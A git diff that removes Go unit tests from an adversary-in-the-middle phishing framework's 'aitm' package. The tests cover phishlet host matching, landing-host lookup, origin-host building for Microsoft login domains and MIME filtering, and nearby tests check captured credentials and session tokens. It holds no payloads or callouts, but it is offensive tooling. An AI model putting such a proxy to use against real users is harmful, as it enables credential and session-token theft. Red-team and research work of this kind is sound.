@@ -9,87 +9,6 @@ import (
 	"github.com/travisbale/mirage/internal/aitm"
 )
 
-// ── Phishlet.MatchesHost ─────────────────────────────────────────────────────
-
-func TestMatchesHost_Match(t *testing.T) {
-	phishlet := &aitm.Phishlet{
-		ProxyHosts: []aitm.ProxyHost{
-			{PhishSubdomain: "login", Domain: "microsoft.com"},
-		},
-	}
-	if !phishlet.MatchesHost("login.phish.example.com", "phish.example.com") {
-		t.Error("expected hostname to match")
-	}
-}
-
-func TestMatchesHost_NoMatch(t *testing.T) {
-	phishlet := &aitm.Phishlet{
-		ProxyHosts: []aitm.ProxyHost{
-			{PhishSubdomain: "login", Domain: "microsoft.com"},
-		},
-	}
-	if phishlet.MatchesHost("other.phish.example.com", "phish.example.com") {
-		t.Error("expected hostname not to match")
-	}
-}
-
-func TestMatchesHost_MultipleHosts(t *testing.T) {
-	phishlet := &aitm.Phishlet{
-		ProxyHosts: []aitm.ProxyHost{
-			{PhishSubdomain: "login", Domain: "microsoft.com"},
-			{PhishSubdomain: "account", Domain: "microsoft.com"},
-		},
-	}
-	if !phishlet.MatchesHost("account.phish.example.com", "phish.example.com") {
-		t.Error("expected second proxy host to match")
-	}
-}
-
-// ── Phishlet.FindLanding ─────────────────────────────────────────────────────
-
-func TestFindLanding_Present(t *testing.T) {
-	phishlet := &aitm.Phishlet{
-		ProxyHosts: []aitm.ProxyHost{
-			{PhishSubdomain: "api", Domain: "microsoft.com", IsLanding: false},
-			{PhishSubdomain: "login", Domain: "microsoft.com", IsLanding: true},
-		},
-	}
-	landing := phishlet.FindLanding()
-	if landing == nil {
-		t.Fatal("expected landing host, got nil")
-	}
-	if landing.PhishSubdomain != "login" {
-		t.Errorf("expected login landing host, got %q", landing.PhishSubdomain)
-	}
-}
-
-func TestFindLanding_Absent(t *testing.T) {
-	phishlet := &aitm.Phishlet{
-		ProxyHosts: []aitm.ProxyHost{
-			{PhishSubdomain: "api", Domain: "microsoft.com", IsLanding: false},
-		},
-	}
-	if phishlet.FindLanding() != nil {
-		t.Error("expected nil when no landing host exists")
-	}
-}
-
-// ── ProxyHost.OriginHost ─────────────────────────────────────────────────────
-
-func TestOriginHost_WithSubdomain(t *testing.T) {
-	host := aitm.ProxyHost{OrigSubdomain: "login", Domain: "microsoftonline.com"}
-	if got := host.OriginHost(); got != "login.microsoftonline.com" {
-		t.Errorf("got %q, want %q", got, "login.microsoftonline.com")
-	}
-}
-
-func TestOriginHost_WithoutSubdomain(t *testing.T) {
-	host := aitm.ProxyHost{Domain: "example.com"}
-	if got := host.OriginHost(); got != "example.com" {
-		t.Errorf("got %q, want %q", got, "example.com")
-	}
-}
-
 // ── Session.IsDone / HasCredentials ──────────────────────────────────────────
 
 func TestIsDone_Completed(t *testing.T) {
@@ -346,21 +265,5 @@ func TestHasRequiredTokens_MixedTokenTypes_OneMissing(t *testing.T) {
 	}
 	if session.HasRequiredTokens(phishlet) {
 		t.Error("expected false when body token is missing even though cookie is present")
-	}
-}
-
-// ── SubFilter.MatchesMIME ────────────────────────────────────────────────────
-
-func TestMatchesMIME_Match(t *testing.T) {
-	filter := aitm.SubFilter{MimeTypes: []string{"text/html", "application/json"}}
-	if !filter.MatchesMIME("text/html; charset=utf-8") {
-		t.Error("expected text/html to match with prefix")
-	}
-}
-
-func TestMatchesMIME_NoMatch(t *testing.T) {
-	filter := aitm.SubFilter{MimeTypes: []string{"text/html"}}
-	if filter.MatchesMIME("application/json") {
-		t.Error("expected application/json not to match text/html filter")
 	}
 }
